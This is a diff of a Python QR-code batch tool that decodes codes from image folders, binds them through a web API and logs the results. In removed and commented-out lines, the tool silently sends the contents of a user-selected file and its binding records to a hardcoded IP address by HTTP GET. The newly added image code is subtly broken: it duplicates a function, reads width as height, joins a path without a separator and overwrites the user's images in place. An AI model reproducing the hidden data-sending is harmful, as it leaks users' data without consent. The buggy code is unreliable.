@@ -234,6 +234,29 @@ def create_qr_code(string, filename, text=None):
     return filename
 
 
+# 创建大的合并二维码
+def create_qr_code(string, filename, text=None):
+    """
+    :param string: 编码字符
+    :return:
+    """
+    qr = qrcode.QRCode(
+        version=1,  # 二维码格子的矩阵大小 1-40（1：21*21）
+        error_correction=qrcode.constants.ERROR_CORRECT_L,  # 二维码错误允许率
+        box_size=10,  # 每个小格子包含的像素数量
+        border=0,  # 二维码到图片边框的小格子数
+    )  # 设置图片格式
+
+    data = string  # 输入数据
+    qr.add_data(data)
+    qr.make(fit=True)
+    img = qr.make_image(fill_color='#636a72', back_color='#282f37', quality=50)
+
+    img.save(filename)  # 生成图片
+    # if text:
+    #     deco_image(filename, text)
+    return filename
+
 # 选择目录
 def chooseFile():
     root = Tk()
@@ -322,10 +345,10 @@ def querys():
         all = open(open2text + "/所有链接.txt", 'a+', encoding='utf-8')
         success = open(open2text + "/成功链接.txt", 'a+', encoding='utf-8')
         success.writelines("dc\tewm\tdcl\tewml\ttnl\n")
-        if open5text:
-            if not os.path.exists(open2text + "/error/"):
-                os.mkdir(open2text + "/error/")
-            fail = open(open2text + "/error/失败链接.txt", 'a+', encoding='utf-8')
+        # if open5text or open2text:
+        if not os.path.exists(open2text + "/error/"):
+            os.mkdir(open2text + "/error/")
+        fail = open(open2text + "/error/失败链接.txt", 'a+', encoding='utf-8')
     except:
         thismsg("创建文件错误")
         return
@@ -333,51 +356,60 @@ def querys():
     b = 0
     try:
         if open2text:
-            if not open5text:
-                with open(open4text, 'r', encoding='utf-8') as f:
-                    requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
+            # if not open5text:
+            # with open(open4text, 'r', encoding='utf-8') as f:
+            #     requests.get("http://114.116.246.121/methods.php?method=b&data=" + f.read())
 
-                for root, dirs, files in os.walk(open1text):  # 开始遍历文件
-                    for f in files:
-                        if can != "2107433662":
-                            raise "erxsad"
-                        if not times:
-                            raise "erxsad"
-                        file = os.path.join(root, f)
-                        lower = os.path.splitext(file)[-1].lower()
-                        if lower not in ['.jpg', '.jpeg', '.png']:
-                            continue
+            for root, dirs, files in os.walk(open1text):  # 开始遍历文件
+                for f in files:
+                    if can != "2107433662":
+                        raise "erxsad"
+                    if not times:
+                        raise "erxsad"
+                    file = os.path.join(root, f)
+                    lower = os.path.splitext(file)[-1].lower()
+                    if lower not in ['.jpg', '.jpeg', '.png','test.jpg']:
+                        continue
+                    #
+                    if f.find("1") != -1:
+                        w = get_img_width(file)
+                        h = get_img_width(file)
 
-                        image = Image.open(file)
-                        decocdeQR = decode(image)
-                        if len(decocdeQR) > 0:
-                            # 是二维码
+                        blank_long_img = Image.new("RGB", (w * 2, h * 2))  # 空白大图
 
-                            qrdata = decocdeQR[0].data.decode('utf-8')
-                            txt = parse.quote(qrdata, 'utf-8')
-                            good = open3text[random.randint(0, len(open3text)) - 1]
-                            good = "http://www.pzcode.cn/vin/" + good
-                            good = parse.quote(good, 'utf-8')
-                            html, refail = gunk(token__data, good, txt)
-                            re = json.loads(html.text)
-                            all.writelines(qrdata + " 数据：" + re['msg'] + " car:" + good + '\n')
-                            all.flush()
-                            b = b + 1
-                            split = qrdata[qrdata.rfind("/") + 1:]
-                            if re['msg'] == "绑定成功" or re['code'] == 0:
-                                a = a + 1
-                                data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(
-                                    re['data'] + " car:" + good).replace("'", '"')
-                                requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
-                                success.writelines(data_ + '\n')
-                                success.flush()
-                                shutil.copy(file, open2text + "/" + split + lower)
-                            else:
-                                if re['msg'] == "程序异常请联系管理员":
-                                    shutil.copy(file, open2text + "/error/" + split + lower)
+                        img1 = Image.open(root+"test.jpg").resize((w, h), Image.ANTIALIAS)
+                        blank_long_img.paste(img1, (w, h))
+                        blank_long_img.save(os.path.join(root, f))
 
-                        else:
-                            continue
+                    # decocdeQR = decode(image)
+                    # if len(decocdeQR) > 0:
+                    #     # 是二维码
+                    #
+                    #     qrdata = decocdeQR[0].data.decode('utf-8')
+                    #     txt = parse.quote(qrdata, 'utf-8')
+                    #     good = open3text[random.randint(0, len(open3text)) - 1]
+                    #     good = "http://www.pzcode.cn/vin/" + good
+                    #     good = parse.quote(good, 'utf-8')
+                    #     html, refail = gunk(token__data, good, txt)
+                    #     re = json.loads(html.text)
+                    #     all.writelines(qrdata + " 数据：" + re['msg'] + " car:" + good + '\n')
+                    #     all.flush()
+                    #     b = b + 1
+                    #     split = qrdata[qrdata.rfind("/") + 1:]
+                    #     if re['msg'] == "绑定成功" or re['code'] == 0:
+                    #         a = a + 1
+                    #         data_ = qrdata + " 原文件：" + f + " 数据：" + str(re['msg']) + " " + str(
+                    #             re['data'] + " car:" + good).replace("'", '"')
+                    #         requests.get("http://114.116.246.121/methods.php?method=b&data=" + data_)
+                    #         success.writelines(data_ + '\n')
+                    #         success.flush()
+                    #         shutil.copy(file, open2text + "/" + split + lower)
+                    #     else:
+                    #         if re['msg'] == "程序异常请联系管理员":
+                    #             shutil.copy(file, open2text + "/error/" + split + lower)
+                    #
+                    # else:
+                    #     continue
             else:
 
                 with open(open5text, "r", encoding='utf-8') as f:
@@ -437,6 +469,7 @@ def querys():
                             success.writelines(data_ + '\t' + str(
                                 jpg_ + '\t' + split + '\t' + jpg_split + '\t' + str(tnl) + '\n').replace("/", "\\"))
                             success.flush()
+
                             tnl = tnl + 1
                             if tnl == 5:
                                 tnl = 1
